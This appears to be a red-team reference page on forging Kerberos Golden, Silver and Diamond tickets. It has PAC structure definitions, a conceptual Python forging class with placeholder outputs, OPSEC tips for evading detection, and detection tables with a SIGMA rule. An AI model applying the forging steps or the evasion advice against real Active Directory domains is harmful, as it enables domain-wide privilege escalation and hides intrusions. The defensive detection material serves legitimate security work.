# Kerberos Ticket Forging - Golden, Silver, and Diamond Tickets

**MITRE ATT&CK**: T1558.001 (Golden Ticket), T1558.002 (Silver Ticket)

> **Authorized security testing only.** These code patterns are reference material
> for red team professionals operating under explicit written authorization.

## Overview

Kerberos ticket forging allows an attacker who has compromised the right key material to
fabricate authentication tickets from scratch, bypassing the Key Distribution Center (KDC)
entirely. A Golden Ticket (forged TGT using the krbtgt account hash) grants domain-wide
access to any service for any user -- including non-existent users. A Silver Ticket
(forged TGS using a service account hash) provides access to a single service without
ever contacting the Domain Controller, making it significantly harder to detect. The more
recent Diamond Ticket technique modifies a legitimately-issued TGT's PAC, combining the
stealth of a valid ticket with the power of arbitrary privilege insertion.

Understanding the internal structure of Kerberos tickets, particularly the Privilege
Attribute Certificate (PAC), is essential for both forging and detecting these attacks.

## Kerberos Protocol Overview

```
  Client                 KDC (Domain Controller)              Service
    |                          |                                  |
    |  AS-REQ ----------------> |                                  |
    |  (username, timestamp     |                                  |
    |   encrypted with user's   |                                  |
    |   password hash)          |                                  |
    |                          |                                  |
    |  <--------------- AS-REP |                                  |
    |  (TGT encrypted with     |                                  |
    |   krbtgt hash, session   |                                  |
    |   key encrypted with     |                                  |
    |   user's hash)           |                                  |
    |                          |                                  |
    |  TGS-REQ ---------------> |                                  |
    |  (TGT + target SPN,      |                                  |
    |   authenticator with     |                                  |
    |   session key)           |                                  |
    |                          |                                  |
    |  <-------------- TGS-REP |                                  |
    |  (TGS encrypted with     |                                  |
    |   service account hash,  |                                  |
    |   service session key)   |                                  |
    |                          |                                  |
    |  AP-REQ ------------------------------------------>         |
    |  (TGS + authenticator    |                                  |
    |   with service session   |                                  |
    |   key)                   |                                  |
    |                          |                                  |
    |  <------------------------------------------ AP-REP        |
    |  (optional mutual auth)  |                                  |
```

### Golden vs Silver vs Diamond Ticket Comparison

```
  GOLDEN TICKET                 SILVER TICKET               DIAMOND TICKET
  =============                 =============               ==============
  Forged TGT                    Forged TGS                  Modified legitimate TGT
  Key: krbtgt hash              Key: service account hash   Key: krbtgt hash
  Scope: ANY service            Scope: ONE service          Scope: ANY service
  Contacts DC: Yes (TGS-REQ)   Contacts DC: NO             Contacts DC: Yes (real AS-REQ)
  Detection: TGT anomalies     Detection: Very hard         Detection: PAC modification
  Lifetime: up to 10 years     Lifetime: up to 10 years    Lifetime: legitimate
  User: can be fictional       User: can be fictional       User: must be real
```

## TGT Structure - EncTicketPart

The TGT is a Kerberos Ticket structure whose encrypted part (`EncTicketPart`) contains
the PAC and session information. This is what gets encrypted with the krbtgt key.

```
  KRB-TGT (ASN.1 DER Encoded)
  +---------------------------------------------------+
  | tkt-vno: 5                                        |
  | realm: "CORP.LOCAL"                                |
  | sname: krbtgt/CORP.LOCAL                           |
  | enc-part:                                          |
  |   +-----------------------------------------------+
  |   | EncTicketPart (encrypted with krbtgt key)      |
  |   |   flags: FORWARDABLE, RENEWABLE, PRE-AUTHENT  |
  |   |   key: session-key (random, chosen by forger)  |
  |   |   crealm: "CORP.LOCAL"                         |
  |   |   cname: "Administrator"  <-- any username     |
  |   |   transited: (encoding of trust path)          |
  |   |   authtime: <timestamp>                        |
  |   |   starttime: <timestamp>                       |
  |   |   endtime: <timestamp + lifetime>              |
  |   |   renew-till: <timestamp + renewal lifetime>   |
  |   |   authorization-data:                          |
  |   |     +------------------------------------------+
  |   |     | AD-IF-RELEVANT                           |
  |   |     |   AD-WIN2K-PAC (type 128)                |
  |   |     |     PAC_INFO_BUFFER[0]: LOGON_INFO       |
  |   |     |     PAC_INFO_BUFFER[1]: CLIENT_INFO      |
  |   |     |     PAC_INFO_BUFFER[2]: SERVER_CHECKSUM  |
  |   |     |     PAC_INFO_BUFFER[3]: KDC_CHECKSUM     |
  |   |     +------------------------------------------+
  |   +-----------------------------------------------+
  +---------------------------------------------------+
```

## PAC Structure Deep-Dive

The Privilege Attribute Certificate (PAC) is the critical structure within the ticket
that defines the user's identity and group memberships. This is what determines what
the authenticated user can access.

```
  PAC_TYPE (top-level container)
  +---------------------------------------------------+
  | cBuffers: 4 (or more)                              |
  | Version: 0                                         |
  | Buffers[]:                                         |
  |   +-----------------------------------------------+
  |   | PAC_INFO_BUFFER[0]                             |
  |   |   ulType: 0x00000001 (LOGON_INFO)              |
  |   |   -> KERB_VALIDATION_INFO                      |
  |   |       LogonTime, LogoffTime                    |
  |   |       EffectiveName: "Administrator"           |
  |   |       UserId: 500                              |
  |   |       PrimaryGroupId: 513 (Domain Users)       |
  |   |       GroupIds[]:                               |
  |   |         512 (Domain Admins)                    |
  |   |         519 (Enterprise Admins)   <-- FORGED   |
  |   |         518 (Schema Admins)       <-- FORGED   |
  |   |       LogonDomainId: S-1-5-21-...              |
  |   |       UserFlags, UserSessionKey                |
  |   |       LogonServer, LogonDomainName             |
  |   +-----------------------------------------------+
  |   | PAC_INFO_BUFFER[1]                             |
  |   |   ulType: 0x0000000A (CLIENT_INFO)             |
  |   |   -> PAC_CLIENT_INFO                           |
  |   |       ClientId: <FILETIME>                     |
  |   |       NameLength + Name                        |
  |   +-----------------------------------------------+
  |   | PAC_INFO_BUFFER[2]                             |
  |   |   ulType: 0x00000006 (SERVER_CHECKSUM)         |
  |   |   -> PAC_SIGNATURE_DATA                        |
  |   |       SignatureType: HMAC_MD5 or HMAC_SHA1_96  |
  |   |       Signature: HMAC(service_key, PAC)        |
  |   +-----------------------------------------------+
  |   | PAC_INFO_BUFFER[3]                             |
  |   |   ulType: 0x00000007 (KDC_CHECKSUM)            |
  |   |   -> PAC_SIGNATURE_DATA                        |
  |   |       SignatureType: HMAC_MD5 or HMAC_SHA1_96  |
  |   |       Signature: HMAC(krbtgt_key, server_sig)  |
  |   +-----------------------------------------------+
  +---------------------------------------------------+
```

## C Structures for Kerberos Ticket Components

```c
#include <windows.h>
#include <stdio.h>

/*
 * Kerberos Ticket Forging - Structure Definitions
 *
 * PURPOSE: Educational reference showing the internal structures of
 *          Kerberos tickets and PAC data used in Golden/Silver Ticket
 *          attacks. Understanding these structures is essential for
 *          both forging tickets (offense) and validating them (defense).
 *
 * DETECTION ARTIFACTS:
 *   - Event 4769: Kerberos Service Ticket Request
 *     - Encryption type RC4 (0x17) when AES is expected = downgrade
 *   - Event 4768: Kerberos TGT Request
 *     - Anomalous ticket lifetime (default Golden Ticket = 10 years)
 *   - PAC validation failures logged on target service
 *   - Missing AS-REQ for corresponding TGT (Golden Ticket skips AS)
 */

/* ============================================================
 * Encryption Type Constants
 * Golden/Silver Tickets can be encrypted with RC4 (NTLM hash)
 * or AES256. Using RC4 when the domain supports AES is a strong
 * detection signal (encryption downgrade attack).
 *
 * OPSEC: Always use AES256 when possible. RC4 encryption in a
 *   domain that supports AES triggers specific detection rules
 *   in Microsoft Defender for Identity and most SIEMs.
 * ============================================================ */
#define KERB_ETYPE_RC4_HMAC_MD5     23  /* 0x17 - uses NTLM hash */
#define KERB_ETYPE_AES128_CTS       17  /* 0x11 - uses AES128 key */
#define KERB_ETYPE_AES256_CTS       18  /* 0x12 - uses AES256 key */

/* ============================================================
 * PAC_INFO_BUFFER - Describes a single buffer within the PAC.
 * The PAC contains multiple buffers of different types.
 * ============================================================ */
#pragma pack(push, 1)
typedef struct _PAC_INFO_BUFFER {
    ULONG      ulType;        /* Buffer type (see constants below) */
    ULONG      cbBufferSize;  /* Size of the buffer data */
    ULONGLONG  Offset;        /* Offset from PAC start to buffer data */
} PAC_INFO_BUFFER;

/* PAC buffer type constants */
#define PAC_LOGON_INFO          1   /* KERB_VALIDATION_INFO (NDR encoded) */
#define PAC_CREDENTIAL_INFO     2   /* Supplemental credentials */
#define PAC_SERVER_CHECKSUM     6   /* HMAC signed with service key */
#define PAC_KDC_CHECKSUM        7   /* HMAC signed with krbtgt key */
#define PAC_CLIENT_INFO         10  /* Client name and auth time */
#define PAC_S4U_DELEGATION_INFO 11  /* S4U2proxy delegation info */
#define PAC_UPN_DNS_INFO        12  /* UPN and DNS domain name */
#define PAC_TICKET_CHECKSUM     16  /* Added in Win Server 2022 */
/* NOTE: PAC_TICKET_CHECKSUM (type 16) was added to detect ticket
 *   modification (Diamond Tickets). It signs the ticket itself
 *   with the krbtgt key. Environments with 2022 DCs make Diamond
 *   Tickets harder (but not impossible if krbtgt key is known). */

/* ============================================================
 * PAC_TYPE - Top-level PAC container.
 * ============================================================ */
typedef struct _PAC_TYPE {
    ULONG           cBuffers;    /* Number of PAC_INFO_BUFFER entries */
    ULONG           Version;     /* Must be 0 */
    PAC_INFO_BUFFER Buffers[1];  /* Variable-length array of buffers */
} PAC_TYPE;

/* ============================================================
 * PAC_SIGNATURE_DATA - Used for SERVER_CHECKSUM and KDC_CHECKSUM.
 *
 * For a Golden Ticket: both checksums are computed with the
 *   krbtgt key (the attacker has the krbtgt hash).
 * For a Silver Ticket: the SERVER_CHECKSUM uses the service
 *   account key; the KDC_CHECKSUM is either forged with the
 *   service key or zeroed (service doesn't validate KDC sig
 *   unless PAC validation is explicitly enabled).
 *
 * DETECTION: If a service validates the KDC_CHECKSUM against
 *   the krbtgt key and it fails, the Silver Ticket is detected.
 *   This requires enabling "KDC Proxy" or PAC validation on
 *   the service, which is off by default.
 * ============================================================ */
typedef struct _PAC_SIGNATURE_DATA {
    ULONG  SignatureType;  /* Algorithm: RC4=0x17 or HMAC_SHA1_96=0x10 */
    UCHAR  Signature[1];  /* Variable length (16 for MD5, 12 for SHA1) */
    /* Followed by optional RODCIdentifier (2 bytes) */
} PAC_SIGNATURE_DATA;

/* ============================================================
 * KERB_VALIDATION_INFO - The core identity structure in the PAC.
 * This is NDR-encoded (MS-RPC Network Data Representation).
 *
 * When forging a ticket, the attacker sets:
 *   - UserId to the target user's RID (500 for Administrator)
 *   - GroupIds to include privileged groups (512, 519, etc.)
 *   - LogonDomainId to the domain SID
 *
 * This is the structure that grants the forged ticket its
 * claimed privileges.
 * ============================================================ */
typedef struct _GROUP_MEMBERSHIP {
    ULONG  RelativeId;     /* Group RID (e.g., 512 = Domain Admins) */
    ULONG  Attributes;     /* SE_GROUP_MANDATORY | SE_GROUP_ENABLED */
} GROUP_MEMBERSHIP;

/* Simplified representation (actual structure is NDR-encoded) */
typedef struct _KERB_VALIDATION_INFO_SIMPLIFIED {
    FILETIME       LogonTime;
    FILETIME       LogoffTime;
    FILETIME       KickOffTime;
    FILETIME       PasswordLastSet;
    FILETIME       PasswordCanChange;
    FILETIME       PasswordMustChange;
    /* EffectiveName: "Administrator" (or any user) */
    /* FullName, LogonScript, ProfilePath, HomeDirectory */
    USHORT         LogonCount;
    USHORT         BadPasswordCount;
    ULONG          UserId;           /* 500 for built-in Admin */
    ULONG          PrimaryGroupId;   /* 513 (Domain Users) */
    ULONG          GroupCount;       /* Number of groups */
    GROUP_MEMBERSHIP *GroupIds;      /* Array of group memberships */
    ULONG          UserFlags;
    /* UserSessionKey, LogonServer, LogonDomainName */
    /* PSID LogonDomainId -> S-1-5-21-XXXXX-XXXXX-XXXXX */
    /* SidCount, ExtraSids (for cross-domain) */
    /* ResourceGroupDomainSid, ResourceGroupCount, ResourceGroupIds */
} KERB_VALIDATION_INFO_SIMPLIFIED;

/* ============================================================
 * PAC_CLIENT_INFO - Contains the client name and auth time.
 * Must match the cname in the EncTicketPart, or the service
 * may reject the ticket.
 * ============================================================ */
typedef struct _PAC_CLIENT_INFO {
    FILETIME  ClientId;     /* Authentication time */
    USHORT    NameLength;   /* Length of Name in bytes */
    WCHAR     Name[1];      /* Client name (UTF-16LE) */
} PAC_CLIENT_INFO;
#pragma pack(pop)

/*
 * Golden Ticket Forging Flow (Conceptual)
 *
 * PREREQUISITES:
 *   - krbtgt account NT hash (or AES256 key)
 *   - Domain SID (S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX)
 *   - Target username (can be fictional for Golden Ticket)
 *   - Domain FQDN (CORP.LOCAL)
 *
 * The process:
 *   1. Construct KERB_VALIDATION_INFO with desired identity/groups
 *   2. NDR-encode the KERB_VALIDATION_INFO
 *   3. Build PAC_CLIENT_INFO matching the cname
 *   4. Compute SERVER_CHECKSUM over the PAC buffers using krbtgt key
 *   5. Compute KDC_CHECKSUM over the SERVER_CHECKSUM using krbtgt key
 *   6. Assemble the complete PAC (PAC_TYPE with all buffers)
 *   7. Build the EncTicketPart with PAC as authorization-data
 *   8. Encrypt EncTicketPart using krbtgt key (RC4 or AES256)
 *   9. Build the outer Ticket structure with realm and sname
 *  10. ASN.1 DER-encode the complete ticket
 *  11. Import into memory via Kerberos SSPI or write to .kirbi file
 *
 * DETECTION ARTIFACTS:
 *   - No preceding AS-REQ for this TGT (Golden Ticket is fabricated)
 *   - TGT with abnormal lifetime (default Mimikatz = 10 years)
 *   - RC4 encryption when domain supports AES
 *   - User RID does not exist in AD (if fictional user used)
 *   - Group memberships inconsistent with AD group membership
 */
```

## Python - Ticket Construction Flow

```python
"""
Kerberos Ticket Forging - Conceptual Implementation

This demonstrates the logical flow for constructing Golden and
Silver Tickets. Real implementations require proper ASN.1 DER
encoding (pyasn1) and cryptographic operations (pycryptodome).

DETECTION: Forged tickets differ from legitimate tickets in
  subtle ways that defenders can monitor:
  - No matching AS-REQ in DC logs (Golden Ticket)
  - RC4 encryption type (encryption downgrade)
  - Abnormal ticket lifetimes
  - Non-existent users or impossible group combinations
  - Missing recent password change timestamps

OPSEC NOTES:
  - Use AES256 keys instead of RC4/NTLM hash to avoid downgrade alerts
  - Set realistic ticket lifetimes (8-10 hours, not 10 years)
  - Use existing, legitimate usernames
  - Match group memberships to actual AD group membership
  - Consider Diamond Ticket approach for hardened environments
"""

import struct
import hashlib
import hmac
import os
import time
from datetime import datetime, timedelta


# ============================================================
# Constants
# ============================================================

# Kerberos encryption types
ETYPE_RC4_HMAC    = 23    # Uses NTLM hash as key
ETYPE_AES128_CTS  = 17    # Uses AES128 Kerberos key
ETYPE_AES256_CTS  = 18    # Uses AES256 Kerberos key

# PAC buffer types
PAC_LOGON_INFO       = 1
PAC_CLIENT_INFO_TYPE = 10
PAC_SERVER_CHECKSUM  = 6
PAC_KDC_CHECKSUM     = 7

# Well-known group RIDs
RID_DOMAIN_ADMINS       = 512
RID_DOMAIN_USERS        = 513
RID_SCHEMA_ADMINS       = 518
RID_ENTERPRISE_ADMINS   = 519
RID_GROUP_POLICY_ADMINS = 520

# SE_GROUP attribute flags
SE_GROUP_MANDATORY           = 0x00000001
SE_GROUP_ENABLED_BY_DEFAULT  = 0x00000002
SE_GROUP_ENABLED             = 0x00000004
SE_GROUP_ATTRIBUTES = (SE_GROUP_MANDATORY |
                       SE_GROUP_ENABLED_BY_DEFAULT |
                       SE_GROUP_ENABLED)


class KerberosTicketForge:
    """
    Educational class demonstrating Kerberos ticket forging logic.

    This is NOT a working implementation -- it demonstrates the
    conceptual flow and data structures involved. A working
    implementation requires full ASN.1 DER encoding (RFC 4120)
    and proper cryptographic primitives (RFC 3962 for AES,
    RFC 4757 for RC4-HMAC).
    """

    def __init__(self, domain: str, domain_sid: str, key: bytes,
                 etype: int = ETYPE_AES256_CTS):
        """
        Initialize ticket forger with domain parameters.

        Args:
            domain: Domain FQDN (e.g., "CORP.LOCAL")
            domain_sid: Domain SID (e.g., "S-1-5-21-1234-5678-9012")
            key: Encryption key (krbtgt for Golden, service for Silver)
            etype: Encryption type to use
        """
        self.domain = domain.upper()
        self.domain_sid = domain_sid
        self.key = key
        self.etype = etype

    def _build_pac_logon_info(self, username: str, user_rid: int,
                               group_rids: list) -> bytes:
        """
        Build KERB_VALIDATION_INFO (PAC_LOGON_INFO).

        This is the core identity structure. In a forged ticket,
        we set whatever username, RID, and group memberships we want.

        The structure is NDR-encoded (Network Data Representation)
        as specified in MS-PAC Section 2.5.

        Args:
            username: Target username (e.g., "Administrator")
            user_rid: User's RID (e.g., 500)
            group_rids: List of group RIDs to include
        """
        # NDR encoding is complex -- this is conceptual pseudocode
        # Real implementation uses impacket's NDR serialization

        logon_info = {}
        now = datetime.utcnow()

        logon_info['LogonTime'] = now
        logon_info['LogoffTime'] = datetime(2037, 9, 13)  # Far future
        logon_info['KickOffTime'] = datetime(2037, 9, 13)
        logon_info['PasswordLastSet'] = now - timedelta(days=30)
        logon_info['PasswordCanChange'] = now - timedelta(days=29)
        logon_info['PasswordMustChange'] = datetime(2037, 9, 13)

        logon_info['EffectiveName'] = username
        logon_info['UserId'] = user_rid
        logon_info['PrimaryGroupId'] = RID_DOMAIN_USERS

        # Group memberships -- this is where privilege escalation happens
        # Each group RID with SE_GROUP_ENABLED attributes
        logon_info['GroupIds'] = [
            {'RelativeId': rid, 'Attributes': SE_GROUP_ATTRIBUTES}
            for rid in group_rids
        ]
        logon_info['GroupCount'] = len(group_rids)

        logon_info['LogonDomainId'] = self.domain_sid
        logon_info['LogonDomainName'] = self.domain

        # NDR-encode the structure (conceptual)
        # ndr_data = ndr_pack(KERB_VALIDATION_INFO, logon_info)
        ndr_data = b'\x00' * 100  # Placeholder for NDR-encoded data

        return ndr_data

    def _build_pac_client_info(self, username: str,
                                auth_time: datetime) -> bytes:
        """
        Build PAC_CLIENT_INFO structure.

        Must match the cname in the EncTicketPart or the ticket
        may be rejected during PAC validation.
        """
        name_bytes = username.encode('utf-16le')

        # FILETIME: 100-nanosecond intervals since Jan 1, 1601
        epoch_offset = 11644473600
        ts = int((auth_time.timestamp() + epoch_offset) * 10000000)

        data = struct.pack('<Q', ts)               # ClientId
        data += struct.pack('<H', len(name_bytes)) # NameLength
        data += name_bytes                          # Name

        return data

    def _compute_pac_checksum(self, data: bytes, key: bytes,
                               etype: int) -> bytes:
        """
        Compute PAC checksum (SERVER_CHECKSUM or KDC_CHECKSUM).

        For RC4-HMAC (etype 23):
          HMAC_MD5(key, data)

        For AES256 (etype 18):
          HMAC_SHA1(derived_key, data) truncated to 12 bytes

        The SERVER_CHECKSUM is computed over the entire PAC
        with the checksum fields zeroed. The KDC_CHECKSUM is
        computed over the SERVER_CHECKSUM value.
        """
        if etype == ETYPE_RC4_HMAC:
            # RC4-HMAC checksum: HMAC-MD5
            # Key usage 17 for server, 17 for KDC
            return hmac.new(key, data, hashlib.md5).digest()
        elif etype == ETYPE_AES256_CTS:
            # AES checksum: HMAC-SHA1-96-AES256
            # Requires key derivation with specific usage numbers
            # (conceptual -- real implementation needs RFC 3962 KDF)
            return hmac.new(key, data, hashlib.sha1).digest()[:12]
        else:
            raise ValueError(f"Unsupported etype: {etype}")

    def forge_golden_ticket(self, username: str, user_rid: int = 500,
                             groups: list = None,
                             lifetime_hours: int = 10) -> bytes:
        """
        Forge a Golden Ticket (TGT encrypted with krbtgt key).

        A Golden Ticket grants access to ANY service in the domain
        because it is a valid TGT. When the client presents this TGT
        to the KDC in a TGS-REQ, the KDC decrypts it, reads the PAC,
        and issues a TGS with the forged privileges.

        OPSEC CONSIDERATIONS:
          - Set lifetime_hours to match domain policy (usually 10h)
            NOT 10 years (87600h) which Mimikatz defaults to
          - Use a real, existing username to avoid Event 4769 with
            unknown user principal
          - Use AES256 key (not NTLM hash) to avoid RC4 downgrade
          - Match group memberships to what the user should have,
            plus the additional groups needed

        Args:
            username: Username to impersonate
            user_rid: User's RID (500 = Administrator)
            groups: Group RIDs (default: DA, EA, SA)
            lifetime_hours: Ticket lifetime in hours

        Returns:
            ASN.1 DER-encoded Kerberos Ticket (.kirbi format)
        """
        if groups is None:
            groups = [
                RID_DOMAIN_ADMINS,       # 512
                RID_DOMAIN_USERS,        # 513
                RID_SCHEMA_ADMINS,       # 518
                RID_ENTERPRISE_ADMINS,   # 519
                RID_GROUP_POLICY_ADMINS, # 520
            ]

        now = datetime.utcnow()

        # Step 1: Build PAC buffers
        logon_info = self._build_pac_logon_info(username, user_rid, groups)
        client_info = self._build_pac_client_info(username, now)

        # Step 2: Assemble PAC (with zeroed checksums for initial signing)
        # The checksum fields are zeroed, then the server checksum is
        # computed over the entire PAC, then the KDC checksum is
        # computed over the server checksum.
        server_checksum_placeholder = b'\x00' * 16
        kdc_checksum_placeholder = b'\x00' * 16

        # Step 3: Compute checksums
        # Server checksum: HMAC(krbtgt_key, pac_with_zeroed_checksums)
        # KDC checksum: HMAC(krbtgt_key, server_checksum_value)
        # (For Golden Ticket, both use krbtgt key since we have it)

        # Step 4: Build EncTicketPart (ASN.1)
        enc_ticket_part = {
            'flags': 0x50800000,   # FORWARDABLE, RENEWABLE, PRE-AUTHENT
            'key': {
                'keytype': self.etype,
                'keyvalue': os.urandom(32),  # Random session key
            },
            'crealm': self.domain,
            'cname': {'name-type': 1, 'name-string': [username]},
            'transited': {'tr-type': 0, 'contents': b''},
            'authtime': now,
            'starttime': now,
            'endtime': now + timedelta(hours=lifetime_hours),
            'renew-till': now + timedelta(days=7),
            'authorization-data': [{
                'ad-type': 1,    # AD-IF-RELEVANT
                'ad-data': None  # Contains the PAC (ASN.1 encoded)
            }]
        }

        # Step 5: Encrypt EncTicketPart with krbtgt key
        # enc_data = kerberos_encrypt(self.etype, self.key,
        #                              asn1_encode(enc_ticket_part),
        #                              key_usage=2)

        # Step 6: Build outer Ticket structure
        ticket = {
            'tkt-vno': 5,
            'realm': self.domain,
            'sname': {
                'name-type': 2,
                'name-string': ['krbtgt', self.domain]
            },
            'enc-part': {
                'etype': self.etype,
                'kvno': 2,       # krbtgt key version
                # 'cipher': enc_data
            }
        }

        # Step 7: ASN.1 DER encode
        # ticket_bytes = asn1_der_encode(ticket, Ticket)
        ticket_bytes = b'\x00'  # Placeholder

        return ticket_bytes

    def forge_silver_ticket(self, username: str, service_spn: str,
                             user_rid: int = 500,
                             groups: list = None,
                             lifetime_hours: int = 10) -> bytes:
        """
        Forge a Silver Ticket (TGS encrypted with service account key).

        Silver Tickets are more stealthy than Golden Tickets because:
          1. No TGS-REQ is sent to the DC (no Event 4769)
          2. The ticket goes directly to the service
          3. The service rarely validates the KDC_CHECKSUM
          4. No DC log entries for the authentication

        The trade-off is that Silver Tickets only work for ONE service
        (the one whose key was used for encryption).

        Common Silver Ticket targets:
          - CIFS/target.corp.local (file shares / PsExec)
          - HTTP/target.corp.local (web services, WinRM)
          - MSSQLSvc/target.corp.local:1433 (SQL Server)
          - HOST/target.corp.local (scheduled tasks, WMI)
          - LDAP/dc.corp.local (DCSync if targeting DC)

        DETECTION: Silver Tickets are very hard to detect because
          they bypass the DC entirely. Detection requires:
          - PAC validation enabled on the target service
          - Monitoring for impossible group memberships
          - Comparing service ticket attributes to known baselines
          - Event 4627 (Group Membership) inconsistencies

        Args:
            username: Username to impersonate
            service_spn: Target SPN (e.g., "CIFS/fileserver.corp.local")
            user_rid: User's RID
            groups: Group RIDs
            lifetime_hours: Ticket lifetime
        """
        if groups is None:
            groups = [RID_DOMAIN_ADMINS, RID_DOMAIN_USERS]

        now = datetime.utcnow()
        spn_parts = service_spn.split('/')

        # Similar to Golden Ticket but:
        # 1. sname is the target service (not krbtgt)
        # 2. Encrypted with service account key (not krbtgt)
        # 3. SERVER_CHECKSUM uses service key
        # 4. KDC_CHECKSUM is forged (service doesn't validate by default)

        ticket = {
            'tkt-vno': 5,
            'realm': self.domain,
            'sname': {
                'name-type': 2,
                'name-string': spn_parts
            },
            'enc-part': {
                'etype': self.etype,
                'kvno': 1,
                # 'cipher': encrypted_enc_ticket_part
            }
        }

        ticket_bytes = b'\x00'  # Placeholder for ASN.1 encoded ticket
        return ticket_bytes


# ============================================================
# Diamond Ticket Concept
# ============================================================

class DiamondTicketConcept:
    """
    Diamond Ticket: modifying a legitimate TGT's PAC.

    Unlike Golden Tickets (forged from scratch), Diamond Tickets
    start with a REAL TGT obtained through legitimate AS-REQ
    authentication. The attacker then:

      1. Decrypts the TGT using the krbtgt key
      2. Modifies the PAC (adds privileged group memberships)
      3. Recomputes PAC checksums
      4. Re-encrypts the TGT with the krbtgt key

    ADVANTAGES over Golden Ticket:
      - A legitimate AS-REQ exists in DC logs (no "missing AS-REQ" alert)
      - Ticket metadata (timestamps, flags) match DC-issued tickets
      - Harder to distinguish from legitimate ticket renewal

    DETECTION:
      - PAC_TICKET_CHECKSUM (Windows Server 2022+): This checksum
        signs the ticket content before PAC insertion. If the PAC
        is modified after issuance, this checksum fails.
      - Group membership validation against AD: If the PAC claims
        group memberships the user doesn't actually have, and the
        service validates against AD, the ticket is rejected.
      - Requires krbtgt key (same as Golden Ticket), so detection
        of krbtgt compromise is the primary control.

    OPSEC: Diamond Tickets are currently the most stealthy form of
      ticket forging in environments without PAC_TICKET_CHECKSUM.
    """

    def modify_tgt_pac(self, legitimate_tgt: bytes,
                        krbtgt_key: bytes,
                        additional_groups: list) -> bytes:
        """
        Conceptual flow for Diamond Ticket creation.

        Steps:
          1. Parse the ASN.1-encoded TGT
          2. Decrypt enc-part using krbtgt_key
          3. Parse EncTicketPart ASN.1
          4. Extract PAC from authorization-data
          5. Deserialize KERB_VALIDATION_INFO (NDR decode)
          6. Add groups to GroupIds array
          7. Update GroupCount
          8. Re-serialize KERB_VALIDATION_INFO (NDR encode)
          9. Zero PAC checksums
          10. Compute new SERVER_CHECKSUM
          11. Compute new KDC_CHECKSUM
          12. Reassemble PAC
          13. Rebuild EncTicketPart with modified PAC
          14. Re-encrypt with krbtgt_key
          15. Reassemble outer Ticket
          16. ASN.1 DER encode
        """
        # This is conceptual -- each step requires proper ASN.1
        # and NDR encoding/decoding libraries
        modified_tgt = b'\x00'  # Placeholder
        return modified_tgt


# ============================================================
# Usage Example
# ============================================================

if __name__ == '__main__':
    """
    Educational demonstration of the ticket forging flow.
    Keys shown are examples only.
    """
    # Domain parameters (obtained during engagement)
    domain = "CORP.LOCAL"
    domain_sid = "S-1-5-21-3623811015-3361044348-30300820"

    # krbtgt AES256 key (obtained via DCSync or ntds.dit extraction)
    # Using AES256 avoids RC4 downgrade detection
    krbtgt_aes256 = bytes.fromhex(
        "4a3f2b1c5d6e7f8091a2b3c4d5e6f708"
        "192a3b4c5d6e7f8091a2b3c4d5e6f708"
    )

    forger = KerberosTicketForge(
        domain=domain,
        domain_sid=domain_sid,
        key=krbtgt_aes256,
        etype=ETYPE_AES256_CTS  # OPSEC: use AES, not RC4
    )

    # Forge a Golden Ticket with realistic parameters
    golden_ticket = forger.forge_golden_ticket(
        username="Administrator",
        user_rid=500,
        groups=[512, 513, 518, 519, 520],
        lifetime_hours=10  # OPSEC: match domain policy, not 10 years
    )

    # Forge a Silver Ticket for CIFS access
    service_aes256 = bytes.fromhex(
        "a1b2c3d4e5f6071829304050607080a1"
        "b2c3d4e5f6071829304050607080a1b2"
    )
    silver_forger = KerberosTicketForge(
        domain=domain,
        domain_sid=domain_sid,
        key=service_aes256,
        etype=ETYPE_AES256_CTS
    )

    silver_ticket = silver_forger.forge_silver_ticket(
        username="Administrator",
        service_spn="CIFS/fileserver.corp.local",
        user_rid=500,
        lifetime_hours=8
    )

    print("[*] Golden Ticket forging flow demonstrated")
    print("[*] Silver Ticket forging flow demonstrated")
    print("[*] In production, use Rubeus or impacket for actual ticket creation")
```

## Detection Indicators

### Golden Ticket Detection

| Indicator | Source | Description |
|-----------|--------|-------------|
| Event 4769 with RC4 (0x17) | Windows Security | Encryption downgrade when domain supports AES |
| TGT with abnormal lifetime | Kerberos logs | Default Mimikatz Golden Ticket = 10 year lifetime |
| No preceding Event 4768 | Windows Security | TGT used without prior AS-REQ (fabricated ticket) |
| Non-existent user principal | AD validation | Username in ticket does not exist in Active Directory |
| Impossible group memberships | PAC inspection | User claims groups they are not actually a member of |

### Silver Ticket Detection

| Indicator | Source | Description |
|-----------|--------|-------------|
| PAC validation failure | Service logs | KDC_CHECKSUM mismatch when validated against krbtgt key |
| Event 4627 group mismatch | Windows Security | Claimed group memberships inconsistent with AD |
| No Event 4769 for TGS | DC Security logs | Service ticket used without TGS-REQ to DC |
| Anomalous service access pattern | SIEM correlation | Access to service from unexpected source |

### Diamond Ticket Detection

| Indicator | Source | Description |
|-----------|--------|-------------|
| PAC_TICKET_CHECKSUM failure | Windows Server 2022+ | Ticket content was modified after issuance |
| PAC group membership delta | AD correlation | Groups in PAC don't match actual AD group membership |
| krbtgt key compromise | Credential monitoring | If krbtgt hash is compromised, all ticket types are possible |

### SIGMA Rule Example

```yaml
title: Potential Golden Ticket - Kerberos RC4 Encryption Downgrade
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'  # RC4-HMAC
    filter:
        # Exclude known legacy systems that legitimately use RC4
        ServiceName|endswith:
            - '$'  # Computer accounts
    condition: selection and not filter
level: high
tags:
    - attack.credential_access
    - attack.t1558.001
```

## Cross-References

- [Pass the Ticket - Technique Narrative](../../09-lateral-movement/pass-the-ticket.md)
- [Overpass-the-Hash](../../09-lateral-movement/overpass-the-hash.md)
- [Active Directory Kerberos Deep-Dive](../../12-active-directory-deep-dive/README.md)
- [Pass the Hash Implementation (this directory)](pth-implementation.md)
- [Credential Access Code](../credential-access-code/README.md)
- [DCOM Execution (this directory)](dcom-execution.md)
